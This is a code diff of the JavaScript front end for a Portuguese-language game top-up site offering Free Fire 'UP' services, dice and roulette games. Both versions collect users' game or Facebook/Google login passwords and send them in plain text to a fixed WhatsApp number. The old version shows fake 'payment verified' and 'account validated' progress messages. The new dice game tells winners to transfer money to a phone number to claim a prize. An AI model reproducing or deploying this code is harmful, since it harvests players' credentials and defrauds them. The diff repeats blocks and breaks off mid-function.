@@ -1,880 +1,282 @@
-/**
- * SISTEMA COMPLETO PARA UP FREE FIRE
- * - Controle de formulário
- * - Integração com WhatsApp
- * - Validações básicas
- */
+// ========== JS Frontend Recarga Fácil Games ==========
 
-// Configurações (EDITÁVEIS)
-const CONFIG = {
-  whatsappNumber: "2389149532", // Seu número com código do país
-  services: {
-    "Bronze": { price: 100, diamonds: 1000 },
-    "Prata": { price: 150, diamonds: 2000 },
-    "Ouro": { price: 200, diamonds: 3000 }
-  },
-  whatsappRegex: /^(?:\+238|238)?\s?[95]\d{6}$/, // Formato CV: (+238) 9XXXXXX ou 5XXXXXX
-  minNameLength: 3,
-  emailRegex: /^[^\s@]+@[^\s@]+\.[^\s@]+$/ // Validação básica de email
-};
-
-// Funções de validação
-function validateName(name) {
-  return name.length >= CONFIG.minNameLength;
+// Envio do formulário para WhatsApp
+const pedidoForm = document.getElementById('pedidoForm');
+if (pedidoForm) {
+  pedidoForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    if (!validarCamposObrigatorios(pedidoForm, ['nome','whatsapp','jogo','idjogo','senha','conta-login','valor'])) {
+      alert('Por favor, preencha todos os campos obrigatórios!');
+      return;
+    }
+    const nome = document.getElementById('nome').value.trim();
+    const whatsapp = document.getElementById('whatsapp').value.trim();
+    const jogo = document.getElementById('jogo').value;
+    const idjogo = document.getElementById('idjogo').value.trim();
+    const senha = document.getElementById('senha').value.trim();
+    const contaLogin = document.getElementById('conta-login').value.trim();
+    const valor = document.getElementById('valor').value;
+    const msg =
+      `*Novo Pedido de Recarga*%0A` +
+      `Nome: ${nome}%0A` +
+      `WhatsApp: ${whatsapp}%0A` +
+      `Jogo: ${jogo}%0A` +
+      `ID/Nome no Jogo: ${idjogo}%0A` +
+      `Conta de Login: ${contaLogin}%0A` +
+      `Senha: ${senha}%0A` +
+      `Valor: ${valor} escudos`;
+    const link = `https://wa.me/2389149532?text=${encodeURIComponent(msg)}`;
+    window.open(link, '_blank');
+    // Bloquear campos e botão após envio
+    Array.from(pedidoForm.elements).forEach(el => {
+      el.disabled = true;
+    });
+    setTimeout(() => {
+      alert('✅ Pedido enviado! Aguarde nosso contato no WhatsApp.');
+    }, 500);
+  });
 }
 
-function validateId(id) {
-  return CONFIG.idRegex.test(id);
+// Notificações dinâmicas
+const notificacoes = [
+  '🔔 Promoção! Recarregue 500 escudos e ganhe bônus de 50!',
+  '🔥 Novo jogo disponível: Brawl Stars!',
+  '💬 Atendimento 24h via WhatsApp!',
+  '🎁 Indique amigos e ganhe descontos exclusivos!'
+];
+function exibirNotificacoes() {
+  const area = document.getElementById('notificacoes');
+  if (!area) return;
+  area.innerHTML = '<h3>Notificações Recentes</h3>' + notificacoes.map(n => `<div class="notificacao">${n}</div>`).join('');
+}
+exibirNotificacoes();
+
+// Jogo de Dados e Recarga de Saldo
+const saldoForm = document.getElementById('saldoForm');
+const jogoDadosArea = document.getElementById('jogo-dados-area');
+const jogarDadosBtn = document.getElementById('jogar-dados');
+const resultadoDados = document.getElementById('resultado-dados');
+
+if (saldoForm) {
+  saldoForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    // Simula registro do saldo e libera o jogo de dados
+    saldoForm.style.display = 'none';
+    jogoDadosArea.style.display = 'block';
+    resultadoDados.innerHTML = '';
+  });
+}
+if (jogarDadosBtn) {
+  jogarDadosBtn.addEventListener('click', function() {
+    // Simula um lançamento de dados (1 a 6)
+    const dado = Math.floor(Math.random() * 6) + 1;
+    let premio = '';
+    switch (dado) {
+      case 6:
+        premio = '🎉 Parabéns! Você ganhou 100 escudos de bônus!';
+        break;
+      case 5:
+        premio = '👏 Você ganhou 50 escudos de bônus!';
+        break;
+      case 4:
+        premio = '😃 Você ganhou 20 escudos de bônus!';
+        break;
+      default:
+        premio = 'Tente novamente! Quem sabe na próxima você ganha um prêmio.';
+    }
+    resultadoDados.innerHTML = `Você tirou <strong>${dado}</strong> no dado.<br>${premio}`;
+    resultadoDados.classList.remove('ganhou','perdeu');
+    if ([4,5,6].includes(dado)) {
+      resultadoDados.classList.add('ganhou');
+      resultadoDados.innerHTML += `<br><span style='color:#ffd700;font-weight:bold;'>Para sacar seu prêmio, transfira o valor ganho para o chip <strong>+238 9149532</strong> e envie o comprovante pelo WhatsApp!</span>`;
+    } else {
+      resultadoDados.classList.add('perdeu');
+    }
+  });
 }
 
-function validateWhatsapp(whatsapp) {
-  // Remove todos os espaços e caracteres especiais
-  const cleanNumber = whatsapp.replace(/[\s\-\(\)]/g, '');
-  
-  // Se começa com +238 ou 238, remove para padronizar
-  const normalizedNumber = cleanNumber.replace(/^\+238/, '').replace(/^238/, '');
-  
-  // Testa o formato (deve começar com 9 ou 5 e ter 7 dígitos no total)
-  return CONFIG.whatsappRegex.test(normalizedNumber);
+// Máscara para campo de WhatsApp (formulários)
+function aplicarMascaraTelefone(input) {
+  input.addEventListener('input', function() {
+    let v = input.value.replace(/\D/g, '');
+    if (v.length > 3) v = v.replace(/(\d{3})(\d)/, '$1 $2');
+    if (v.length > 7) v = v.replace(/(\d{3}) (\d{3})(\d)/, '$1 $2 $3');
+    input.value = v;
+  });
 }
+const telInputs = [
+  document.getElementById('whatsapp'),
+  document.getElementById('whatsapp-dados')
+].filter(Boolean);
+telInputs.forEach(aplicarMascaraTelefone);
 
-function validateEmail(email) {
-  return CONFIG.emailRegex.test(email);
+// Validação extra de campos obrigatórios
+function validarCamposObrigatorios(form, campos) {
+  let valido = true;
+  campos.forEach(id => {
+    const el = document.getElementById(id);
+    if (el && !el.value.trim()) {
+      el.style.borderColor = 'red';
+      valido = false;
+    } else if (el) {
+      el.style.borderColor = '';
+    }
+  });
+  return valido;
 }
-
-// Loading state
-function setLoadingState(isLoading) {
-  const submitBtn = document.querySelector('.submit-btn');
-  if (isLoading) {
-    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
-    submitBtn.disabled = true;
-  } else {
-    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Enviar Pedido';
-    submitBtn.disabled = false;
-  }
-}
-
-// Quando o DOM estiver pronto
-document.addEventListener("DOMContentLoaded", function() {
-  // 1. Controle do Formulário Principal
-  const form = document.getElementById("pedidoForm");
-  if (form) {
-    form.addEventListener("submit", async function(e) {
+if (pedidoForm) {
+  pedidoForm.addEventListener('submit', function(e) {
+    if (!validarCamposObrigatorios(pedidoForm, ['nome','whatsapp','jogo','idjogo','senha','conta-login','valor'])) {
       e.preventDefault();
-        // Obtém os valores dos campos
-      const nome = this.querySelector("[name='nome']").value.trim();
-      const conta = this.querySelector("[name='conta']").value;
-      const email = this.querySelector("[name='email']").value.trim();
-      const senha = this.querySelector("[name='senha']").value;
-      const whatsapp = this.querySelector("[name='whatsapp']").value.trim();
-      const servico = this.querySelector("[name='servico']").value;
-      const metodoPagamento = this.querySelector("[name='pagamento']:checked")?.value;      // Validação completa
-      if (!nome || !validateName(nome)) {
-        showAlert("⚠️ Nome inválido! Digite seu nome completo.", "warning");
-        return;
-      }
-
-      if (!conta) {
-        showAlert("⚠️ Selecione sua conta vinculada (Facebook ou Google)!", "warning");
-        return;
-      }
-      
-      if (!email || !validateEmail(email)) {
-        showAlert("⚠️ Email inválido! Digite o email da sua conta vinculada.", "warning");
-        return;
-      }
-
-      if (!senha || !validatePassword(senha)) {
-        showAlert("⚠️ A senha deve ter pelo menos 6 caracteres!", "warning");
-        return;
-      }
-
-      if (!whatsapp || !validateWhatsapp(whatsapp)) {
-        showAlert("⚠️ WhatsApp inválido! Use o formato +238 9XXXXXX ou +238 5XXXXXX", "warning");
-        return;
-      }
-      
-      // Validação da conta Free Fire
-      const accountValid = await validateAccount(email, senha);
-      if (!accountValid) {
-        return;
-      }
-
-      if (!servico) {
-        showAlert("⚠️ Selecione um serviço!", "warning");
-        return;
-      }
-
-      if (!metodoPagamento) {
-        showAlert("⚠️ Selecione um método de pagamento!", "warning");
-        return;
-      }
-
-      // Mostra loading
-      setLoadingState(true);      try {
-        // Mostra o modal de processo
-        showProcessModal();
-
-        // Simula o processo automático
-        await simulateAutomatedProcess();
-        
-        // Formata a mensagem (incluindo a senha)
-        const mensagem = formatMessage(nome, conta, email, senha, whatsapp, servico, metodoPagamento);
-        
-        // Envia para WhatsApp
-        const enviado = await sendToWhatsApp(mensagem);
-        
-        if (!enviado) {
-          throw new Error("Não foi possível abrir o WhatsApp");
-        }
-
-        // Reset do formulário e salva no histórico
-        this.reset();
-        saveToHistory({
-          nome,
-          conta,
-          email: maskEmail(email),
-          servico,
-          data: new Date().toISOString()
-        });
-
-        // Feedback de sucesso
-        showAlert("✅ Pedido enviado com sucesso! Verifique seu WhatsApp.", "success");
-      } catch (error) {
-        console.error("Erro no envio:", error);
-        hideProcessModal();
-        showAlert(`❌ ${error.message || "Erro ao enviar pedido. Tente novamente."}`, "error");
-      } finally {
-        setLoadingState(false);
-      }
-    });
-  }
-
-  // 2. Atualiza preços dinamicamente
-  const serviceSelect = document.querySelector("[name='servico']");
-  if (serviceSelect) {
-    serviceSelect.addEventListener("change", function() {
-      const selectedService = CONFIG.services[this.value];
-      if (selectedService) {
-        document.getElementById("preco-dinamico").textContent = `${selectedService.price}$`;
-        document.getElementById("diamantes-dinamico").textContent = `${selectedService.diamonds} diamantes`;
-      }
-    });
-  }
-
-  // 3. Carrega histórico se existir
-  loadHistory();
-
-  // 4. Restaura dados do formulário
-  restoreFormData();
-
-  // 5. Salva dados do formulário ao mudar
-  document.querySelectorAll('#pedidoForm input, #pedidoForm select').forEach(element => {
-    element.addEventListener('change', saveFormData);
+      alert('Por favor, preencha todos os campos obrigatórios!');
+      return;
+    }
   });
+}
+if (saldoForm) {
+  saldoForm.addEventListener('submit', function(e) {
+    if (!validarCamposObrigatorios(saldoForm, ['nome-dados','whatsapp-dados','valor-saldo'])) {
+      e.preventDefault();
+      alert('Por favor, preencha todos os campos obrigatórios!');
+      return;
+    }
+  });
+}
 
-  // Calculadora de Diamantes
-  setupCalculator();
+// Rotação automática de notificações
+let notifIndex = 0;
+function rotacionarNotificacoes() {
+  const area = document.getElementById('notificacoes');
+  if (!area) return;
+  notifIndex = (notifIndex + 1) % notificacoes.length;
+  area.innerHTML = '<h3>Notificações Recentes</h3>' + `<div class="notificacao">${notificacoes[notifIndex]}</div>`;
+}
+setInterval(rotacionarNotificacoes, 5000);
 
-  // Mini-jogo da Roleta
-  setupRoulette();
-});
+// Estilo para notificações e jogo de dados
+const style = document.createElement('style');
+style.innerHTML = `
+  .notificacao { background: #e3f2fd; color: #1976d2; border-radius: 8px; padding: 10px; margin-bottom: 8px; font-weight: 500; }
+  #jogo-dados-area { text-align: center; }
+  .ganhou { color: green; font-weight: bold; }
+  .perdeu { color: red; font-weight: bold; }
+`;
+document.head.appendChild(style);
 
-// Salva pedido no histórico
-function saveToHistory(pedido) {
-  const historico = JSON.parse(localStorage.getItem('pedidos') || '[]');
-  // Remove informações sensíveis antes de salvar
-  const pedidoSeguro = {
-    ...pedido,
-    email: pedido.email.replace(/(.{2})(.*)(@.*)/, '$1***$3'), // Oculta parte do email
+// Indique e Ganhe - Compartilhamento WhatsApp
+const btnIndicar = document.getElementById('btn-indicar');
+const msgIndicacao = document.getElementById('msg-indicacao');
+if (btnIndicar) {
+  btnIndicar.onclick = function() {
+    const texto = encodeURIComponent('Olha esse site de recarga de jogos! Ganhe bônus e prêmios: https://seusite.com');
+    window.open(`https://wa.me/?text=${texto}`, '_blank');
+    if (msgIndicacao) {
+      msgIndicacao.textContent = '✅ Obrigado por compartilhar! Quando seu amigo recarregar, você ganha 10% de bônus!';
+    }
   };
-  historico.unshift(pedidoSeguro); // Adiciona no início
-  if (historico.length > 10) historico.pop(); // Mantém apenas os 10 últimos
-  localStorage.setItem('pedidos', JSON.stringify(historico));
 }
 
-// Carrega histórico
-function loadHistory() {
-  const historico = JSON.parse(localStorage.getItem('pedidos') || '[]');
-  if (historico.length > 0) {
-    const historicoHtml = historico.map(pedido => `
-      <div class="historic-item">
-        <strong>${pedido.nome}</strong> - ${pedido.servico}
-        <br>
-        <small>ID: ${pedido.id} | Data: ${new Date(pedido.data).toLocaleDateString()}</small>
-      </div>
-    `).join('');
+// Roleta da Sorte (apenas números)
+const roletaCanvas = document.getElementById('roletaCanvas');
+const ctx = roletaCanvas ? roletaCanvas.getContext('2d') : null;
+const girarBtn = document.getElementById('girarRoleta');
+const resultadoRoleta = document.getElementById('resultado-roleta');
 
-    // Adiciona histórico se o elemento existir
-    const historicoElement = document.getElementById('historico');
-    if (historicoElement) {
-      historicoElement.innerHTML = historicoHtml;
-    }
+const setores = [
+  { texto: '1', cor: '#ffd700' },
+  { texto: '2', cor: '#23272a' },
+  { texto: '3', cor: '#ffd700' },
+  { texto: '4', cor: '#23272a' },
+  { texto: '5', cor: '#ffd700' },
+  { texto: '6', cor: '#23272a' }
+];
+const totalSetores = setores.length;
+let anguloAtual = 0;
+let girando = false;
+
+function desenharRoleta(angulo = 0) {
+  if (!ctx) return;
+  ctx.clearRect(0, 0, roletaCanvas.width, roletaCanvas.height);
+  const raio = roletaCanvas.width / 2;
+  for (let i = 0; i < totalSetores; i++) {
+    const inicio = angulo + (i * 2 * Math.PI) / totalSetores;
+    const fim = angulo + ((i + 1) * 2 * Math.PI) / totalSetores;
+    ctx.beginPath();
+    ctx.moveTo(raio, raio);
+    ctx.arc(raio, raio, raio, inicio, fim);
+    ctx.closePath();
+    ctx.fillStyle = setores[i].cor;
+    ctx.fill();
+    // Centralizar o número no centro da fatia
+    const anguloTexto = inicio + (fim - inicio) / 2;
+    const x = raio + Math.cos(anguloTexto) * (raio * 0.65);
+    const y = raio + Math.sin(anguloTexto) * (raio * 0.65) + 10;
+    ctx.save();
+    ctx.font = 'bold 32px Arial';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    ctx.fillStyle = setores[i].cor === '#ffd700' ? '#23272a' : '#ffd700';
+    ctx.shadowColor = '#000';
+    ctx.shadowBlur = 2;
+    ctx.fillText(setores[i].texto, x, y);
+    ctx.restore();
   }
+  // Indicador
+  ctx.beginPath();
+  ctx.moveTo(raio, 10);
+  ctx.lineTo(raio - 12, 30);
+  ctx.lineTo(raio + 12, 30);
+  ctx.closePath();
+  ctx.fillStyle = '#e74c3c';
+  ctx.fill();
 }
 
-// Salva os dados do formulário no localStorage
-function saveFormData() {
-    const formData = {
-        nome: document.getElementById('nome').value,
-        email: document.getElementById('email').value,
-        whatsapp: document.getElementById('whatsapp').value,
-        conta: document.getElementById('conta').value,
-        servico: document.getElementById('servico').value
-    };
-    localStorage.setItem('formData', JSON.stringify(formData));
-}
-
-// Restaura os dados do formulário
-function restoreFormData() {
-    const savedData = localStorage.getItem('formData');
-    if (savedData) {
-        const formData = JSON.parse(savedData);
-        document.getElementById('nome').value = formData.nome || '';
-        document.getElementById('email').value = formData.email || '';
-        document.getElementById('whatsapp').value = formData.whatsapp || '';
-        document.getElementById('conta').value = formData.conta || '';
-        document.getElementById('servico').value = formData.servico || '';
-    }
-}
-
-// Formata a mensagem para WhatsApp
-function formatMessage(nome, conta, email, senha, whatsapp, servico, metodoPagamento) {
-  const dataHora = new Date().toLocaleString('pt-BR');
-  const valorTotal = CONFIG.services[servico].price;
-  const valorEntrada = Math.ceil(valorTotal * 0.6); // 60% do valor total
-  const valorRestante = valorTotal - valorEntrada; // 40% restante
-
-  return `\u{1F3AE} *NOVO PEDIDO DE UP* \u{1F3AE}\n\n` +
-         `\u{1F4C5} Data: ${dataHora}\n` +
-         `━━━━━━━━━━━━━━━\n` +
-         `\u{1F464} *DADOS DO CLIENTE*\n` +
-         `Nome: ${nome}\n` +
-         `WhatsApp: ${whatsapp}\n\n` +
-         `\u{1F3AF} *DADOS DO SERVIÇO*\n` +
-         `Pacote: ${servico}\n` +
-         `Valor Total: ${valorTotal}$\n` +
-         `\u{1F4B8} Entrada (60%): ${valorEntrada}$\n` +
-         `\u{1F4B0} Restante (40%): ${valorRestante}$ após conclusão\n` +
-         `Bônus: ${CONFIG.services[servico].diamonds} diamantes\n\n` +
-         `\u{1F510} *DADOS DA CONTA*\n` +
-         `Tipo: ${conta}\n` +
-         `Email: ${email}\n` +
-         `Senha: ${senha} (Senha da conta ${conta})\n\n` +
-         `\u{1F4B3} *PAGAMENTO*\n` +
-         `Método: ${metodoPagamento}\n` +
-         `Status: \u{23F3} Aguardando pagamento da entrada (${valorEntrada}$)\n\n` +
-         `━━━━━━━━━━━━━━━\n` +
-         `\u{2728} Sistema Automático FF UP Pro\n` +
-         `\u{2139} Pague ${valorEntrada}$ para iniciar o serviço\n` +
-         `\u{1F449} Os ${valorRestante}$ restantes serão pagos após a conclusão`;
-}
-
-// Envia para WhatsApp
-function sendToWhatsApp(message) {
-  return new Promise((resolve, reject) => {
-    try {
-      const url = `https://wa.me/${CONFIG.whatsappNumber}?text=${encodeURIComponent(message)}`;
-      
-      // Cria um link temporário
-      const link = document.createElement('a');
-      link.href = url;
-      link.target = '_blank';
-      link.rel = 'noopener noreferrer';
-      link.style.display = 'none';
-      document.body.appendChild(link);
-      
-      // Simula o clique do usuário
-      link.click();
-      
-      // Remove o link
-      document.body.removeChild(link);
-      
-      // Considera como sucesso
-      resolve(true);
-    } catch (error) {
-      console.error("Erro ao abrir WhatsApp:", error);
-      reject(new Error("Não foi possível abrir o WhatsApp. Por favor, clique no botão 'Conversar' na seção de contato."));
-    }
-  });
-}
-
-// Função de alerta melhorada
-function showAlert(message, type = "info") {
-  const alertDiv = document.createElement("div");
-  alertDiv.className = `custom-alert alert-${type}`;
-  alertDiv.textContent = message;
-  document.body.appendChild(alertDiv);
-  
-  setTimeout(() => {
-    alertDiv.remove();
-  }, 5000);
-}
-
-// Função para alternar visibilidade da senha
-function togglePassword() {
-  const senhaInput = document.getElementById('senha');
-  const toggleButton = document.querySelector('.toggle-password i');
-  
-  if (senhaInput.type === 'password') {
-    senhaInput.type = 'text';
-    toggleButton.className = 'fas fa-eye-slash';
-  } else {
-    senhaInput.type = 'password';
-    toggleButton.className = 'fas fa-eye';
-  }
-}
-
-// Função para mascarar senha na mensagem
-function maskPassword(password) {
-  return '•'.repeat(password.length);
-}
-
-// Validação de senha
-function validatePassword(password) {
-  return password.length >= 6; // Senha deve ter pelo menos 6 caracteres
-}
-
-// Funções para o processo automático
-function showProcessModal() {
-    const modal = document.getElementById('processModal');
-    if (modal) {
-        modal.classList.add('active');
-    }
-}
-
-function hideProcessModal() {
-    const modal = document.getElementById('processModal');
-    if (modal) {
-        modal.classList.remove('active');
-    }
-}
-
-async function simulateAutomatedProcess() {
-    try {
-        const steps = document.querySelectorAll('.progress-step');
-        const processMessage = document.querySelector('.process-message');
-        if (!steps.length || !processMessage) {
-            console.error('Elementos do modal não encontrados');
-            return;
-        }
-
-        const messages = [
-            "Verificando pagamento...",
-            "Validando dados da conta...",
-            "Iniciando serviço...",
-            "Serviço ativado com sucesso!"
-        ];
-
-        for (let i = 0; i < steps.length; i++) {
-            // Atualiza o passo atual
-            steps[i].classList.add('active');
-            processMessage.textContent = messages[i];
-
-            // Aguarda um tempo para simular o processamento
-            await new Promise(resolve => setTimeout(resolve, 1500));
-
-            // Marca o passo como concluído
-            steps[i].classList.add('done');
-        }
-
-        // Aguarda um momento final para mostrar o sucesso
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        showAlert("✅ Serviço ativado com sucesso!", "success");
-        hideProcessModal();
-    } catch (error) {
-        console.error('Erro no processo automático:', error);
-        hideProcessModal();
-        showAlert("❌ Erro ao processar pedido. Tente novamente.", "error");
-    }
-}
-
-// Função para mascarar email no histórico
-function maskEmail(email) {
-    return email.replace(/(.{2})(.*)(@.*)/, '$1***$3');
-}
-
-// Função para validar a conta Free Fire
-async function validateAccount(email, senha) {
-  try {
-    showAlert("⌛ Verificando credenciais da conta...", "info");
-    
-    // Simulando verificação de conta (pode ser substituído por uma API real)
-    const response = await new Promise((resolve) => {
-      setTimeout(() => {
-        // Simulação de validação básica
-        const accountValid = email.length > 0 && senha.length >= 6;
-        resolve({
-          success: accountValid,
-          message: accountValid ? 
-            "Conta verificada com sucesso!" : 
-            "Não foi possível verificar a conta. Verifique suas credenciais."
-        });
-      }, 2000); // Simula delay de rede
-    });
-
-    if (response.success) {
-      showAlert("✅ " + response.message, "success");
-      return true;
+function girarRoletaAnimado() {
+  if (girando) return;
+  girando = true;
+  resultadoRoleta.textContent = '';
+  let velocidade = Math.random() * 0.15 + 0.25;
+  let giros = Math.floor(Math.random() * 3) + 5;
+  let totalFrames = giros * totalSetores * 10;
+  let frame = 0;
+  function animar() {
+    frame++;
+    anguloAtual += velocidade;
+    velocidade *= 0.985;
+    desenharRoleta(anguloAtual);
+    if (frame < totalFrames || velocidade > 0.01) {
+      requestAnimationFrame(animar);
     } else {
-      showAlert("❌ " + response.message, "error");
-      return false;
-    }
-  } catch (error) {
-    console.error("Erro na verificação da conta:", error);
-    showAlert("❌ Erro ao verificar a conta. Tente novamente.", "error");
-    return false;
-  }
-}
-
-// Validação em tempo real
-function setupRealTimeValidation() {
-    // Validação do nome
-    document.getElementById('nome').addEventListener('input', function() {
-        const isValid = validateName(this.value);
-        this.style.borderColor = isValid ? '#4CAF50' : '#f44336';
-    });
-
-    // Validação do email
-    document.getElementById('email').addEventListener('input', function() {
-        const isValid = validateEmail(this.value);
-        this.style.borderColor = isValid ? '#4CAF50' : '#f44336';
-    });
-
-    // Validação da senha
-    document.getElementById('senha').addEventListener('input', function() {
-        const isValid = validatePassword(this.value);
-        this.style.borderColor = isValid ? '#4CAF50' : '#f44336';
-    });
-
-    // Validação do WhatsApp
-    document.getElementById('whatsapp').addEventListener('input', function() {
-        const isValid = validateWhatsapp(this.value);
-        this.style.borderColor = isValid ? '#4CAF50' : '#f44336';
-    });
-}
-
-// Inicializa validação em tempo real quando o documento carregar
-document.addEventListener('DOMContentLoaded', function() {
-    setupRealTimeValidation();
-    // 1. Controle do Formulário Principal
-    const form = document.getElementById("pedidoForm");
-    if (form) {
-      form.addEventListener("submit", async function(e) {
-        e.preventDefault();
-          // Obtém os valores dos campos
-        const nome = this.querySelector("[name='nome']").value.trim();
-        const conta = this.querySelector("[name='conta']").value;
-        const email = this.querySelector("[name='email']").value.trim();
-        const senha = this.querySelector("[name='senha']").value;
-        const whatsapp = this.querySelector("[name='whatsapp']").value.trim();
-        const servico = this.querySelector("[name='servico']").value;
-        const metodoPagamento = this.querySelector("[name='pagamento']:checked")?.value;      // Validação completa
-        if (!nome || !validateName(nome)) {
-          showAlert("⚠️ Nome inválido! Digite seu nome completo.", "warning");
-          return;
-        }
-
-        if (!conta) {
-          showAlert("⚠️ Selecione sua conta vinculada (Facebook ou Google)!", "warning");
-          return;
-        }
-        
-        if (!email || !validateEmail(email)) {
-          showAlert("⚠️ Email inválido! Digite o email da sua conta vinculada.", "warning");
-          return;
-        }
-
-        if (!senha || !validatePassword(senha)) {
-          showAlert("⚠️ A senha deve ter pelo menos 6 caracteres!", "warning");
-          return;
-        }
-
-        if (!whatsapp || !validateWhatsapp(whatsapp)) {
-          showAlert("⚠️ WhatsApp inválido! Use o formato +238 9XXXXXX ou +238 5XXXXXX", "warning");
-          return;
-        }
-        
-        // Validação da conta Free Fire
-        const accountValid = await validateAccount(email, senha);
-        if (!accountValid) {
-          return;
-        }
-
-        if (!servico) {
-          showAlert("⚠️ Selecione um serviço!", "warning");
-          return;
-        }
-
-        if (!metodoPagamento) {
-          showAlert("⚠️ Selecione um método de pagamento!", "warning");
-          return;
-        }
-
-        // Mostra loading
-        setLoadingState(true);      try {
-          // Mostra o modal de processo
-          showProcessModal();
-
-          // Simula o processo automático
-          await simulateAutomatedProcess();
-          
-          // Formata a mensagem (incluindo a senha)
-          const mensagem = formatMessage(nome, conta, email, senha, whatsapp, servico, metodoPagamento);
-          
-          // Envia para WhatsApp
-          const enviado = await sendToWhatsApp(mensagem);
-          
-          if (!enviado) {
-            throw new Error("Não foi possível abrir o WhatsApp");
-          }
-
-          // Reset do formulário e salva no histórico
-          this.reset();
-          saveToHistory({
-            nome,
-            conta,
-            email: maskEmail(email),
-            servico,
-            data: new Date().toISOString()
-          });
-
-          // Feedback de sucesso
-          showAlert("✅ Pedido enviado com sucesso! Verifique seu WhatsApp.", "success");
-        } catch (error) {
-          console.error("Erro no envio:", error);
-          hideProcessModal();
-          showAlert(`❌ ${error.message || "Erro ao enviar pedido. Tente novamente."}`, "error");
-        } finally {
-          setLoadingState(false);
-        }
-      });
-    }
-
-    // 2. Atualiza preços dinamicamente
-    const serviceSelect = document.querySelector("[name='servico']");
-    if (serviceSelect) {
-      serviceSelect.addEventListener("change", function() {
-        const selectedService = CONFIG.services[this.value];
-        if (selectedService) {
-          document.getElementById("preco-dinamico").textContent = `${selectedService.price}$`;
-          document.getElementById("diamantes-dinamico").textContent = `${selectedService.diamonds} diamantes`;
-        }
-      });
-    }
-
-    // 3. Carrega histórico se existir
-    loadHistory();
-
-    // 4. Restaura dados do formulário
-    restoreFormData();
-
-    // 5. Salva dados do formulário ao mudar
-    document.querySelectorAll('#pedidoForm input, #pedidoForm select').forEach(element => {
-      element.addEventListener('change', saveFormData);
-    });
-
-    // Calculadora de Diamantes
-    setupCalculator();
-
-    // Mini-jogo da Roleta
-    setupRoulette();
-});
-
-// Calculadora de Diamantes
-function setupCalculator() {
-    const valorGasto = document.getElementById('valorGasto');
-    const resultadoDiamantes = document.getElementById('resultadoDiamantes');
-    const resultadoBonus = document.getElementById('resultadoBonus');
-
-    valorGasto.addEventListener('input', function() {
-        const valor = parseFloat(this.value) || 0;
-        // Cálculo básico: cada $1 = 10 diamantes
-        const diamantes = Math.floor(valor * 10);
-        // Bônus: 10% extra
-        const bonus = Math.floor(diamantes * 0.1);
-        
-        resultadoDiamantes.textContent = diamantes;
-        resultadoBonus.textContent = bonus;
-        
-        // Animar números
-        resultadoDiamantes.classList.add('success-animation');
-        resultadoBonus.classList.add('success-animation');
-        
-        setTimeout(() => {
-            resultadoDiamantes.classList.remove('success-animation');
-            resultadoBonus.classList.remove('success-animation');
-        }, 500);
-    });
-}
-
-// Removed setupRoulette() since it's now in roulette.js
-
-// Salva pedido no histórico
-function saveToHistory(pedido) {
-  const historico = JSON.parse(localStorage.getItem('pedidos') || '[]');
-  // Remove informações sensíveis antes de salvar
-  const pedidoSeguro = {
-    ...pedido,
-    email: pedido.email.replace(/(.{2})(.*)(@.*)/, '$1***$3'), // Oculta parte do email
-  };
-  historico.unshift(pedidoSeguro); // Adiciona no início
-  if (historico.length > 10) historico.pop(); // Mantém apenas os 10 últimos
-  localStorage.setItem('pedidos', JSON.stringify(historico));
-}
-
-// Carrega histórico
-function loadHistory() {
-  const historico = JSON.parse(localStorage.getItem('pedidos') || '[]');
-  if (historico.length > 0) {
-    const historicoHtml = historico.map(pedido => `
-      <div class="historic-item">
-        <strong>${pedido.nome}</strong> - ${pedido.servico}
-        <br>
-        <small>ID: ${pedido.id} | Data: ${new Date(pedido.data).toLocaleDateString()}</small>
-      </div>
-    `).join('');
-
-    // Adiciona histórico se o elemento existir
-    const historicoElement = document.getElementById('historico');
-    if (historicoElement) {
-      historicoElement.innerHTML = historicoHtml;
+      finalizarRoleta();
     }
   }
+  animar();
 }
 
-// Salva os dados do formulário no localStorage
-function saveFormData() {
-    const formData = {
-        nome: document.getElementById('nome').value,
-        email: document.getElementById('email').value,
-        whatsapp: document.getElementById('whatsapp').value,
-        conta: document.getElementById('conta').value,
-        servico: document.getElementById('servico').value
-    };
-    localStorage.setItem('formData', JSON.stringify(formData));
-}
-
-// Restaura os dados do formulário
-function restoreFormData() {
-    const savedData = localStorage.getItem('formData');
-    if (savedData) {
-        const formData = JSON.parse(savedData);
-        document.getElementById('nome').value = formData.nome || '';
-        document.getElementById('email').value = formData.email || '';
-        document.getElementById('whatsapp').value = formData.whatsapp || '';
-        document.getElementById('conta').value = formData.conta || '';
-        document.getElementById('servico').value = formData.servico || '';
-    }
-}
-
-// Formata a mensagem para WhatsApp
-function formatMessage(nome, conta, email, senha, whatsapp, servico, metodoPagamento) {
-  const dataHora = new Date().toLocaleString('pt-BR');
-  const valorTotal = CONFIG.services[servico].price;
-  const valorEntrada = Math.ceil(valorTotal * 0.6); // 60% do valor total
-  const valorRestante = valorTotal - valorEntrada; // 40% restante
-
-  return `\u{1F3AE} *NOVO PEDIDO DE UP* \u{1F3AE}\n\n` +
-         `\u{1F4C5} Data: ${dataHora}\n` +
-         `━━━━━━━━━━━━━━━\n` +
-         `\u{1F464} *DADOS DO CLIENTE*\n` +
-         `Nome: ${nome}\n` +
-         `WhatsApp: ${whatsapp}\n\n` +
-         `\u{1F3AF} *DADOS DO SERVIÇO*\n` +
-         `Pacote: ${servico}\n` +
-         `Valor Total: ${valorTotal}$\n` +
-         `\u{1F4B8} Entrada (60%): ${valorEntrada}$\n` +
-         `\u{1F4B0} Restante (40%): ${valorRestante}$ após conclusão\n` +
-         `Bônus: ${CONFIG.services[servico].diamonds} diamantes\n\n` +
-         `\u{1F510} *DADOS DA CONTA*\n` +
-         `Tipo: ${conta}\n` +
-         `Email: ${email}\n` +
-         `Senha: ${senha} (Senha da conta ${conta})\n\n` +
-         `\u{1F4B3} *PAGAMENTO*\n` +
-         `Método: ${metodoPagamento}\n` +
-         `Status: \u{23F3} Aguardando pagamento da entrada (${valorEntrada}$)\n\n` +
-         `━━━━━━━━━━━━━━━\n` +
-         `\u{2728} Sistema Automático FF UP Pro\n` +
-         `\u{2139} Pague ${valorEntrada}$ para iniciar o serviço\n` +
-         `\u{1F449} Os ${valorRestante}$ restantes serão pagos após a conclusão`;
-}
-
-// Envia para WhatsApp
-function sendToWhatsApp(message) {
-  return new Promise((resolve, reject) => {
-    try {
